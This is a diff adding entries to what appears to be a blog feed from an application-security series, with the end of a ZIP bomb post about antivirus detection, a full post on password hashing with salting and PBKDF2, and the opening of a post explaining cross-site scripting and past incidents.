+&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/ad187b3c99dcaa837438d580a3886f67ac1799e475e8fced23a02fb44ebaf41f/detection"&gt;dorste.zip&lt;/a&gt;: &lt;a href="https://en.wikipedia.org/wiki/Avast"&gt;Avast&lt;/a&gt;, &lt;a href="https://en.wikipedia.org/wiki/AVG_AntiVirus"&gt;AVG&lt;/a&gt;, Cyren, &lt;a href="https://en.wikipedia.org/wiki/ESET"&gt;Eset&lt;/a&gt;, &lt;a href="https://en.wikipedia.org/wiki/Sophos"&gt;Sophos&lt;/a&gt;, and &lt;a href="https://en.wikipedia.org/wiki/Trend_Micro"&gt;Trend Micro&lt;/a&gt; detected it. 10 programs were unable to process the file.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/725d25f1f5ecf498210c546d517e25f70ea07b48423de2a4648db80b56b81f56/detection"&gt;self-built.zip&lt;/a&gt;: Antiy-AVL, Baidu, MAX detected it. 7 timed out. 11 were unable to process it.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="clamav"&gt;ClamAV&lt;/h3&gt;
+&lt;p&gt;The first release of &lt;a href="https://en.wikipedia.org/wiki/Clam_AntiVirus"&gt;ClamAV&lt;/a&gt; was in 2001, it was developed by Cisco and is open-source now. I&amp;rsquo;ve installed ClamAV 0.102.4/25962 . I try it with the &lt;a href="https://pypi.org/project/clamd/"&gt;clamd&lt;/a&gt; binding:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;clamd&lt;/span&gt;
+
+&lt;span class="n"&gt;cd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;clamd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ClamdUnixSocket&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="n"&gt;cd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;scan&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"/home/martin-thoma/bomb.zip"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;It gave the same output fordroste.zip , 42.zip , and my self-built.zip . None of them were detected.&lt;/p&gt;
+&lt;h3 id="commercial-av-software"&gt;Commercial AV Software&lt;/h3&gt;
+&lt;p&gt;I&amp;rsquo;ve contacted Avast, AVG, ESET, Sophos, and Trend Micro via private Twitter messages. I&amp;rsquo;ve explained that I&amp;rsquo;m writing a blog post and that their product &amp;mdash; according to VirusTotal &amp;mdash; does not recognize the ZIP bombs.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;TrendMicro&lt;/strong&gt; sent me to their &lt;a href="https://helpcenter.trendmicro.com/en-US/contact-support/"&gt;support site&lt;/a&gt;. I think I wrote them a support ticket, but due to the fact that this is just a web form and I don&amp;rsquo;t have any copy of that, I&amp;rsquo;m not sure. Those contact forms are super annoying and I gave up trying to ask the question.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Sophos&lt;/strong&gt; redirected me to their &lt;a href="https://support.sophos.com/support"&gt;support site&lt;/a&gt;. I have opened a case and I&amp;rsquo;m waiting for a response.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Avast&lt;/strong&gt; gave me a brief answer, but it was super unclear to me what they are actually doing. I&amp;rsquo;m still trying to clarify.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;AVG&lt;/strong&gt; responded, but essentially told me that they try to find the answer to my question internally.&lt;/p&gt;
+&lt;p&gt;In contrast, the experience with &lt;strong&gt;ESET&lt;/strong&gt; was extremely positive. I&amp;rsquo;ve got in contact with &lt;a href="https://www.linkedin.com/in/thomas-uhlemann-6661a382/"&gt;Thomas Uhlemann&lt;/a&gt; who could directly tell me what ESET is doing: They check archives until a depth of 10, meaning they can limit the effect of recursive packing. Additionally, they put limitations on the file size, memory usage, and the maximum amount of time for a scan. Apparently, the users can also adjust those limits. This information is also &lt;a href="https://help.eset.com/eis/14/en-US/idh_config_threat_sense.html"&gt;publicly documented&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id="whats-next_1"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
+&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers 😈 and also techniques of the defenders 😇:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) 😇&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;And this is about to come:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CSRF 😈&lt;/li&gt;
+&lt;li&gt;DOS 😈&lt;/li&gt;
+&lt;li&gt;Credential Stuffing 😈&lt;/li&gt;
+&lt;li&gt;Cryptojacking 😈&lt;/li&gt;
+&lt;li&gt;Single-Sign-On 😇&lt;/li&gt;
+&lt;li&gt;Two-Factor Authentication 😇&lt;/li&gt;
+&lt;li&gt;Backups 😇&lt;/li&gt;
+&lt;li&gt;Disk Encryption 😇&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="Security"></category><category term="AppSec"></category></entry><entry><title>Password Hashing 😇</title><link href="https://martin-thoma.com/https://levelup.gitconnected.com/password-hashing-eb3b97684636" rel="alternate"></link><published>2020-10-19T20:00:00+02:00</published><updated>2020-10-19T20:00:00+02:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-10-19:/https://levelup.gitconnected.com/password-hashing-eb3b97684636</id><summary type="html">&lt;p&gt;Software gets hacked, data breaches happen, data is leaked. It&amp;rsquo;s not a rare exception but happens all the time. We need to acknowledge that software is not perfect. This is where the concept of defense in depth comes into play.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;h1 id="defense-in-depth-means-we-dont-rely-on-a-single-security-mechanism-but-have-multiple-layers-of-security-instead"&gt;Defense in depth means we don&amp;rsquo;t rely on …&lt;/h1&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;Software gets hacked, data breaches happen, data is leaked. It&amp;rsquo;s not a rare exception but happens all the time. We need to acknowledge that software is not perfect. This is where the concept of defense in depth comes into play.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;h1 id="defense-in-depth-means-we-dont-rely-on-a-single-security-mechanism-but-have-multiple-layers-of-security-instead"&gt;Defense in depth means we don&amp;rsquo;t rely on a single security mechanism, but have multiple layers of security instead.&lt;/h1&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Password hashing is a prime example of defense in depth. If our database is secure, we don&amp;rsquo;t need password hashing. We hope it is the case and defend the database as well as possible, but we prepare for the worst case. We prepare for an attacker getting access to our users&amp;rsquo; login credentials.&lt;/p&gt;
+&lt;p&gt;A key idea of privacy comes into play: You don&amp;rsquo;t have to worry about data you don&amp;rsquo;t have. In the case of passwords, we don&amp;rsquo;t store the passwords. Not even an encrypted version. We store a hashed version.&lt;/p&gt;
+&lt;p&gt;This way the effect is hopefully limited to our service. We need to tell the users that their accounts and data might have been exposed, but at least nobody will use the same username/password combination to log into their bank/Amazon/Social accounts.&lt;/p&gt;
+&lt;h2 id="what-is-hashing"&gt;What is Hashing?&lt;/h2&gt;
+&lt;p&gt;Hashing is like cooking. Given the recipe (the hashing algorithm) and the ingredients (the password), you can always get the same result. Just given the result (the hash), it is virtually impossible to reverse the process (figure out the password).&lt;/p&gt;
+&lt;p&gt;There are non-cryptographic hashing functions and cryptographic ones. The cryptographic ones are designed to be hard to compute. Meaning they take a lot of CPU power/time to apply. This is on purpose. If you need a few milliseconds to apply it on your (weak) server, the attacker hopefully also needs quite a while to apply it billions of times on huge dictionaries to crack the encrypted accounts with brute force.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Photo by American Heritage Chocolate on Unsplash" src="https://cdn-images-1.medium.com/max/11800/0*JY7QzN4RasPmA7Nf"/&gt;&lt;em&gt;Photo by &lt;a href="https://unsplash.com/@americanheritagechocolate?utm_source=medium&amp;amp;utm_medium=referral"&gt;American Heritage Chocolate&lt;/a&gt; on &lt;a href="https://unsplash.com?utm_source=medium&amp;amp;utm_medium=referral"&gt;Unsplash&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;h2 id="why-it-matters"&gt;Why it Matters&lt;/h2&gt;
+&lt;p&gt;There are &lt;a href="https://en.wikipedia.org/wiki/List_of_data_breaches"&gt;so many leaks&lt;/a&gt;, it is hard to keep track of the leaks.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;2012&lt;/strong&gt;: LinkedIn leaked 6.5 million passwords. Passwords have been hashed with SHA-1 and were not salted (&lt;a href="https://arstechnica.com/information-technology/2012/06/8-million-leaked-passwords-connected-to-linkedin/"&gt;source&lt;/a&gt;).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2013&lt;/strong&gt;: Adobe leaked 130 million passwords (&lt;a href="https://www.theguardian.com/technology/2013/nov/07/adobe-password-leak-can-check"&gt;source&lt;/a&gt;). The passwords were encrypted, not hashed.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2016&lt;/strong&gt;: LinkedIn got hacked and used a weak hashing algorithm (&lt;a href="https://www.zdnet.com/article/these-are-the-worst-passwords-from-the-linkedin-hack"&gt;source&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2019&lt;/strong&gt;: 1.2 million passwords got leaked via the porn site Luscious(&lt;a href="https://www.forbes.com/sites/daveywinder/2019/08/20/popular-porn-site-breach-exposed-12-million-anonymous-user-profiles/#3c0cbe067039"&gt;source&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2019&lt;/strong&gt;: Facebook had hundreds of millions of passwords stored in plain text (&lt;a href="https://about.fb.com/news/2019/03/keeping-passwords-secure/"&gt;source 1&lt;/a&gt;, &lt;a href="https://www.nytimes.com/2019/03/21/technology/personaltech/facebook-passwords.html"&gt;source 2&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2019&lt;/strong&gt;: Zynga leaked 170 million passwords (&lt;a href="https://www.theguardian.com/games/2019/dec/19/170m-passwords-stolen-in-zynga-words-with-friends-hack-monitor-says"&gt;source&lt;/a&gt;). Zynga used hashing and salting.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;You can see if you might have been affected by &lt;a href="https://haveibeenpwned.com/"&gt;haveibeenpwned.com&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id="salt-because-hashing-is-not-enough"&gt;Salt &amp;mdash; because hashing is not enough&lt;/h2&gt;
+&lt;p&gt;When credentials are leaked, it essentially is a big table with usernames and
+the (hopefully) hashed passwords. If you applied the same algorithm to all
+passwords, you can see which users have the same passwords. Extra information
+such as the user names, the usage of the platform, or other attacks such as
+phishing might lead to information about those passwords.&lt;/p&gt;
+&lt;p&gt;To counter such password cracking attacks, a string is added to the password.
+This string is randomly generated for each user. The string is stored
+side-by-side to the password. The only reason to have that string is to make
+the same plain-text password have different hash values.&lt;/p&gt;
+&lt;h2 id="how-can-i-hash-passwords"&gt;How can I hash passwords?&lt;/h2&gt;
+&lt;p&gt;Computing a key from a password which then can be stored now got quite a bit
+more complex: We need the password, a hashing function, a random salt per user,
+and sometimes even a number of rounds to hash. There is a lot of possibilities
+to get it wrong. Also, what do you do to migrate from one hashing function to
+another? What do you do to increase the number of rounds as hardware becomes
+better?&lt;/p&gt;
+&lt;p&gt;You for sure don&amp;rsquo;t want to always force users to enter a new password. You want
+to be able to let users migrate over time.&lt;/p&gt;
+&lt;p&gt;A key derivation function as implemented in Pythons
+&lt;a href="https://pypi.org/project/Werkzeug/"&gt;werkzeug&lt;/a&gt; package with adjustable
+computational difficulty like &lt;a href="https://en.wikipedia.org/wiki/PBKDF2"&gt;PBKDF2&lt;/a&gt; is
+your friend. It&amp;rsquo;s a function that takes the password, the hashing function, the
+salt, the number of rounds. It returns the key. In most programming languages
+you two functions:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;generate_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;hash_function&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salt_length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="o"&gt;...&lt;/span&gt;
+
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;check_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;bool&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="o"&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;As an example:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;werkzeug&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;security&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;generate_password_hash&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;gen_key&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;gen_key&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;"foobar"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;"pbkdf2:sha512:1000"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salt_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;key&lt;/span&gt;
+&lt;span class="s1"&gt;'pbkdf2:sha512:1000**$**qc8Q9uqK**$**4f28daacb10dea6667e00c866607073b7a740817e8c4a267c1cedd05cf36cbdf609b14cf446d73d76819f37a3e0475160d444a4fab39526e72aca611960e4c77'&lt;/span&gt;
+
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;werkzeug&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;security&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;check_password_hash&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;check_key&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;check_key&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;"foobar"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;True&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;You can see that the first part of the method contains all the parameters necessary for the method. This means it is easy to extend. The second part (delimited by the Dollar symbol) is the 8 characters of the salt. Then comes the password which is hashed with the given method and salt.&lt;/p&gt;
+&lt;p&gt;There are other key derivate functions. Most notably &lt;a href="https://en.wikipedia.org/wiki/Scrypt"&gt;scrypt&lt;/a&gt;, which was not only designed to be demanding to the CPU but also requires much memory. For Python, there is passlib which offers a lot of hashing functions and key derivation functions. However, it seems not too wide-spread (&lt;a href="https://github.com/pallets/werkzeug/issues/1917#issuecomment-710762497"&gt;source&lt;/a&gt;). Instead, you can create something similar on your own by using core Python functions such as &lt;a href="https://docs.python.org/3/library/hashlib.html#hashlib.scrypt"&gt;hashlib.scrypt&lt;/a&gt; . A noteworthy key derivation function is &lt;a href="https://en.wikipedia.org/wiki/Argon2"&gt;Argon2&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id="common-mistakes"&gt;Common Mistakes&lt;/h2&gt;
+&lt;p&gt;Let&amp;rsquo;s make a checklist. If you are a developer, I hope you can checkmark those:&lt;/p&gt;
+&lt;p&gt;☑ I don&amp;rsquo;t store passwords in plain text.
+☑ I don&amp;rsquo;t use encryption for passwords.
+☑ I don&amp;rsquo;t use a non-cryptographic hashing function (e.g. CRC-32, )
+☑ I don&amp;rsquo;t use a weak cryptographic hashing function (e.g. MD5, SHA-1)
+☑ I use a different, randomly calculated salt for each user for calculating the hashes.&lt;/p&gt;
+&lt;p&gt;As a user, I hope you can checkmark the following points:&lt;/p&gt;
+&lt;p&gt;☑ I don&amp;rsquo;t re-use passwords. Ever.
+☑ I don&amp;rsquo;t share my passwords.
+☑ I don&amp;rsquo;t use weak passwords.
+☑ I make sure I don&amp;rsquo;t &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;leak my secrets&lt;/a&gt;.
+☑ I am aware of phishing. (If you are not &amp;mdash; a blog post will follow😀)&lt;/p&gt;
+&lt;p&gt;As a developer, you can prevent some mistakes from the user by a password policy. For example, making it mandatory to have at least 8 characters and maybe run the password through a simple dictionary attack before you allow it. I wouldn&amp;rsquo;t put password rules up, though. &lt;a href="https://xkcd.com/936/"&gt;XKCD 936&lt;/a&gt; explains why.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Image by Oliver Widder (Geek and Poke)" src="https://cdn-images-1.medium.com/max/2992/1*BYKHbPTILDYTxW2Xug8xPA.jpeg"/&gt;&lt;em&gt;Image by Oliver Widder (&lt;a href="https://geekandpoke.typepad.com/geekandpoke/2009/08/post20-security.html"&gt;Geek and Poke&lt;/a&gt;)&lt;/em&gt;&lt;/p&gt;
+&lt;h2 id="what-can-i-do-as-a-user"&gt;What can I do as a user?&lt;/h2&gt;
+&lt;p&gt;As a user, you should &lt;strong&gt;use different passwords for different services&lt;/strong&gt;. The passwords should not be super weak as well (e.g. guessable). This combination makes it impossible for me to just memorize. I have only a handful of strong passwords I memorize. For the rest, I need to &lt;strong&gt;use a password manager&lt;/strong&gt;. The password manager can then suggest strong passwords as well.&lt;/p&gt;
+&lt;p&gt;A strong password has high entropy. This means:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;At least 8 characters. Let&amp;rsquo;s rather be safe and have at least 10 characters.&lt;/li&gt;
+&lt;li&gt;A rich character set (e.g. upper- and lower-case letters, digits, special characters)&lt;/li&gt;
+&lt;li&gt;Is not a combination of only two or three words in a dictionary&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;You can also &lt;strong&gt;change your passwords regularly&lt;/strong&gt;. This will make sure that people who had access for a while without being noticed will be blocked out again.&lt;/p&gt;
+&lt;h2 id="see-also"&gt;See also&lt;/h2&gt;
+&lt;p&gt;It feels like &lt;a href="https://en.wikipedia.org/wiki/Tom_Scott_(entertainer)"&gt;Tom Scott&lt;/a&gt; / &lt;a href="https://www.youtube.com/user/Computerphile"&gt;Computerphile&lt;/a&gt; made a video about all the security topics I want to write about 😄&lt;/p&gt;
+&lt;p&gt;&lt;center&gt;&lt;iframe allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/8ZtInClXe1Q" width="560"&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
+&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers 😈 and also techniques of the defenders 😇:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) 😇&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;And this is about to come:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CSRF 😈&lt;/li&gt;
+&lt;li&gt;DOS 😈&lt;/li&gt;
+&lt;li&gt;Credential Stuffing 😈&lt;/li&gt;
+&lt;li&gt;Cryptojacking 😈&lt;/li&gt;
+&lt;li&gt;Single-Sign-On 😇&lt;/li&gt;
+&lt;li&gt;Two-Factor Authentication 😇&lt;/li&gt;
+&lt;li&gt;Backups 😇&lt;/li&gt;
+&lt;li&gt;Disk Encryption 😇&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="InfoSec"></category><category term="AppSec"></category><category term="Security"></category><category term="Cybersecurity"></category><category term="Password"></category></entry><entry><title>Cross-site Scripting (XSS) 😈</title><link href="https://martin-thoma.com/https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f" rel="alternate"></link><published>2020-10-16T20:00:00+02:00</published><updated>2020-10-16T20:00:00+02:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-10-16:/https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f</id><summary type="html">&lt;p&gt;Cross-site scripting (XSS) is a type of attack on websites where the attacker can make the attacked website deliver JavaScript to the user. This malicious JavaScript is then executed on the users&amp;rsquo; machine.&lt;/p&gt;
+&lt;p&gt;Various types of XSS are distinguished:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt;: The attacker can make the website store the XSS …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;Cross-site scripting (XSS) is a type of attack on websites where the attacker can make the attacked website deliver JavaScript to the user. This malicious JavaScript is then executed on the users&amp;rsquo; machine.&lt;/p&gt;
+&lt;p&gt;Various types of XSS are distinguished:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt;: The attacker can make the website store the XSS, e.g. by crafting a comment on Facebook or a chat message on Twitch which contains the malicious message. The malicious message is then delivered to every new client which accesses the page.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Reflected XSS&lt;/strong&gt;: Some websites allow you to create links that you can share. For example, a Google search. The URL contains the search term and if somebody clicks on that link, Google will show the search term from the link on the page. So Google reflects a parameter of the link on the page. If an attacker changes the search term to contain code, that code could potentially be executed by the browser of any user who clicks on the link.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;DOM-based XSS&lt;/strong&gt;: In modern web applications the logic is mostly in the client. This means the attacker does not have to go to the server-side to do harm. The on-site JavaScript is attacked. In contrast to the reflected XSS, the server didn&amp;rsquo;t directly cause the issue. The (valid) JavaScript on the page read the attack.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The &lt;strong&gt;attack surface&lt;/strong&gt; is pretty big for modern websites. Any user-supplied
+data can contain an XSS attack. It could be a comments section, advertisement,
+the document.referrer, URL fragments, &amp;hellip;&lt;/p&gt;
+&lt;h2 id="why-it-matters"&gt;Why it Matters&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;XSS is part of the &lt;a href="https://owasp.org/www-project-top-ten/"&gt;OWASP Top-10&lt;/a&gt;, meaning it&amp;rsquo;s recognized as a common vulnerability&lt;/li&gt;
+&lt;li&gt;There are &lt;strong&gt;14,625 CVE entries for XSS&lt;/strong&gt; vulnerabilities on mitre.org (&lt;a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cross-site"&gt;source&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2005&lt;/strong&gt;: MySpace had a worm called &lt;a href="https://en.wikipedia.org/wiki/Samy_(computer_worm)"&gt;Samy&lt;/a&gt;. Within 20 hours, the author got one million users to friend him (&lt;a href="https://www.vice.com/en/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever"&gt;source&lt;/a&gt;). &lt;strong&gt;MySpace had to take the site down because of this XSS attack.&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2011&lt;/strong&gt;: Facebook worm allows automatic wall posts (&lt;a href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6c4ddf17-8e6d-4e92-8bec-f918cbf61afc&amp;amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;amp;tab=librarydocuments"&gt;source&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2013&lt;/strong&gt;: PayPal was vulnerable as discovered by &lt;a href="https://s3cur3.it/references"&gt;Robert Kugler&lt;/a&gt; (&lt;a href="https://seclists.org/fulldisclosure/2013/May/163"&gt;source&lt;/a&gt;). It was likely possible to create a link which made a payment when you clicked on it, without you needing to interact.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2013&lt;/strong&gt;: Yahoo was vulnerable to reflected XSS (&lt;a href="https://arstechnica.com/information-technology/2013/01/how-yahoo-allowed-hackers-to-hijack-my-neighbors-e-mail-account/"&gt;source&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2016&lt;/strong&gt;: Researcher found XSS vulnerability on Facebook (&lt;a href="https://whitton.io/articles/xss-on-facebook-via-png-content-types/"&gt;source&lt;/a&gt;)&lt;/li&gt;
